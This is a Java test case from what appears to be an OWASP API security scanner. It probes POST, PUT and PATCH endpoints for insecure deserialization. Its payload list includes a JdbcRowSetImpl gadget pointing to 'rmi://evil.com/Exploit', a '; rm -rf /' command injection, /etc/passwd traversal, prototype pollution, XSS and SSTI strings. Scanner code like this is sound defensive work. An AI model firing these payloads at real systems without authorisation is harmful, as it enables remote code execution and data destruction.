package org.owasp.astf.testcases;

import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.owasp.astf.core.EndpointInfo;
import org.owasp.astf.core.config.ScanConfig;
import org.owasp.astf.core.http.HttpClient;
import org.owasp.astf.core.http.HttpResponse;
import org.owasp.astf.core.result.Finding;
import org.owasp.astf.core.result.Severity;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.HashMap;

/**
 * Tests for API8:2023 - Insecure Deserialization.
 * 
 * This test case checks for insecure deserialization vulnerabilities by sending
 * malicious payloads that could trigger unsafe object creation or code execution.
 * Insecure deserialization occurs when untrusted data is used to abuse the logic
 * of an application, leverage injection flaws, or execute arbitrary remote code.
 * 
 * @see <a href="https://owasp.org/API-Security/editions/2023/en/0xa8-insecure-deserialization/">OWASP API Security Top 10 2023: API8 Insecure Deserialization</a>
 */
public class InsecureDeserializationTestCase implements TestCase {
    private static final Logger logger = LogManager.getLogger(InsecureDeserializationTestCase.class);

    private ScanConfig config;

    // ✅ PAYLOAD ДЛЯ РАЗНЫХ ТИПОВ API (включая Open Banking)
    private static final List<String> DESERIALIZATION_PAYLOADS = List.of(
        // JSON-based deserialization (common in modern APIs)
        "{\"@type\":\"java.lang.Class\",\"val\":\"com.malicious.Hack\"}", // Jackson
        "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com/Exploit\",\"autoCommit\":true}", // RMI
        "{\"__proto__\":{\"isAdmin\":true}}", // Prototype pollution
        "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}", // Prototype pollution
        "{\"$.class\":{\"@type\":\"java.lang.Class\",\"val\":\"com.malicious.Hack\"}}", // OGNL
        
        // Open Banking specific payloads (for JSON requests)
        "{\"consentId\":\"; rm -rf /\",\"accountId\":\"test\"}", // Command injection in JSON
        "{\"account_id\":\"../../../etc/passwd\",\"bank_id\":\"test\"}", // Path traversal in JSON
        "{\"client_id\":\"<script>alert('XSS')</script>\",\"permissions\":[\"ReadAccounts\"]}", // XSS in JSON
        "{\"account_id\":\"{{7*7}}\",\"request_id\":\"test\"}", // SSTI in JSON
        
        // Generic JSON payloads
        "{\"id\":\"1\",\"type\":\"__proto__\",\"value\":{\"isAdmin\":true}}",
        "{\"data\":{\"__proto__\":{\"polluted\":\"value\"}}}",
        "{\"input\":{\"constructor\":{\"prototype\":{\"polluted\":\"value\"}}}}"
    );

    @Override
    public void init(ScanConfig config) {
        this.config = config;
    }

    @Override
    public String getId() {
        return "API8:2023";
    }

    @Override
    public String getName() {
        return "Insecure Deserialization (API8:2023)";
    }

    @Override
    public String getDescription() {
        return """
               Tests for insecure deserialization vulnerabilities by sending malicious payloads
               that could trigger unsafe object creation, code execution, or data manipulation.
               """;
    }

    @Override
    public List<Finding> execute(EndpointInfo endpoint, HttpClient client) throws IOException {
        List<Finding> findings = new ArrayList<>();

        // ✅ ПРОВЕРКА: Только POST/PUT/POST-запросы (где есть тело)
        String method = endpoint.getMethod().toUpperCase();
        if (!("POST".equals(method) || "PUT".equals(method) || "PATCH".equals(method))) {
            logger.debug("⏭️ Skipping non-data endpoint for deserialization test: {}", endpoint.getPath());
            return findings;
        }

        System.out.println("🔧 Testing insecure deserialization on: " + method + " " + endpoint.getPath());

        // ✅ ИСПОЛЬЗУЕМ АУТЕНТИФИКАЦИОННЫЕ ЗАГОЛОВКИ ИЗ КОНФИГА
        Map<String, String> authHeaders = config.getHeaders() != null ? config.getHeaders() : new HashMap<>();
        authHeaders.put("Content-Type", "application/json"); // ✅ Устанавливаем JSON Content-Type

        // ✅ ТЕСТИРУЕМ РАЗНЫЕ PAYLOAD
        for (String payload : DESERIALIZATION_PAYLOADS) {
            List<Finding> payloadFindings = testDeserializationPayload(endpoint, client, payload, authHeaders);
            findings.addAll(payloadFindings);
        }

        if (findings.isEmpty()) {
            System.out.println("✅ Deserialization protection verified: " + endpoint.getMethod() + " " + endpoint.getPath());
        } else {
            System.out.println("🎯 Deserialization vulnerabilities found: " + findings.size() + " on " + endpoint.getPath());
        }

        return findings;
    }

    /**
     * ✅ Тестирует один payload на уязвимость десериализации
     */
    private List<Finding> testDeserializationPayload(EndpointInfo endpoint, HttpClient client, String payload, Map<String, String> authHeaders) {
        List<Finding> findings = new ArrayList<>();

        try {
            logger.debug("🧪 Testing deserialization payload: {}", payload);

            // ✅ ИСПРАВЛЕНО: Используем post с тремя параметрами
            HttpResponse response = client.post(endpoint.getFullUrl(), authHeaders, payload);

            int statusCode = response.getStatusCode();
            String responseBody = response.getResponseBody(); // ✅ ИСПРАВЛЕНО: getResponseBody()

            // ✅ АНАЛИЗИРУЕМ ОТВЕТ НА ПРИЗНАКИ УЯЗВИМОСТИ
            if (isDeserializationVulnerable(statusCode, responseBody, payload)) {
                findings.add(createDeserializationFinding(endpoint, payload, statusCode, responseBody));
                System.out.println("🚨 DESERIALIZATION VULNERABILITY: " + payload);
            } else {
                System.out.println("✅ Deserialization protection: blocked payload on " + endpoint.getPath());
            }

        } catch (Exception e) {
            logger.debug("Deserialization test failed for payload {}: {}", payload, e.getMessage());
            // Не считаем ошибку за уязвимость
        }

        return findings;
    }

    /**
     * ✅ Проверяет, уязвим ли эндпоинт к десериализации
     */
    private boolean isDeserializationVulnerable(int statusCode, String responseBody, String payload) {
        if (responseBody == null) {
            return false;
        }

        String lowerResponse = responseBody.toLowerCase();

        // ✅ ПРИЗНАКИ УСПЕШНОЙ ДЕСЕРИАЛИЗАЦИИ (уязвимость!)
        if (statusCode == 200) {
            // Если сервер успешно обработал подозрительный payload
            return (payload.contains("@type") && lowerResponse.contains("class")) ||
                   (payload.contains("__proto__") && lowerResponse.contains("polluted")) ||
                   (payload.contains("constructor") && lowerResponse.contains("prototype"));
        }

        // ✅ ПРИЗНАКИ ОШИБКИ ДЕСЕРИАЛИЗАЦИИ (тоже уязвимость!)
        if (statusCode >= 400 && statusCode < 600) {
            return lowerResponse.contains("deserialization") ||
                   lowerResponse.contains("serialization") ||
                   lowerResponse.contains("class") ||
                   lowerResponse.contains("java") ||
                   lowerResponse.contains("object") ||
                   lowerResponse.contains("instantiation") ||
                   lowerResponse.contains("reflection") ||
                   lowerResponse.contains("injection") ||
                   lowerResponse.contains("command") ||
                   lowerResponse.contains("process");
        }

        // ✅ ПО УМОЛЧАНИЮ: если нет явных признаков безопасности
        return false;
    }

    /**
     * ✅ Создаёт finding для уязвимости десериализации
     */
    private Finding createDeserializationFinding(EndpointInfo endpoint, String payload, int statusCode, String response) {
        return new Finding(
            "DESER-01",
            "Insecure Deserialization (API8:2023)",
            "🚨 CRITICAL: Insecure deserialization vulnerability detected!\n\n" +
            "• Payload: " + payload + "\n" +
            "• Endpoint: " + endpoint.getMethod() + " " + endpoint.getPath() + "\n" +
            "• Response Status: " + statusCode + "\n" +
            "• Response Length: " + (response != null ? response.length() : 0) + " chars\n" +
            "• Impact: Attackers can execute arbitrary code, escalate privileges, or manipulate server-side logic",
            Severity.CRITICAL,
            getId(),
            endpoint.getFullUrl(),
            "✅ CRITICAL REMEDIATION REQUIRED:\n\n" +
            "1. IMPLEMENT STRICT INPUT VALIDATION\n" +
            "   • Use JSON Schema validation for all input data\n" +
            "   • Whitelist allowed data structures and types\n" +
            "   • Reject objects with dangerous properties (@type, __proto__, constructor)\n\n" +
            "2. AVOID UNSAFE DESERIALIZATION\n" +
            "   • Never deserialize untrusted data directly\n" +
            "   • Use safe alternatives like DTOs or data binding\n" +
            "   • Validate object structure before deserialization\n\n" +
            "3. APPLY SECURITY PATCHES\n" +
            "   • Keep serialization libraries updated\n" +
            "   • Monitor for known vulnerabilities in JSON parsers\n\n" +
            "4. IMPLEMENT RUNTIME MONITORING\n" +
            "   • Monitor for unusual deserialization patterns\n" +
            "   • Log and alert on suspicious payloads\n" +
            "   • Deploy WAF with deserialization protection rules"
        );
    }
}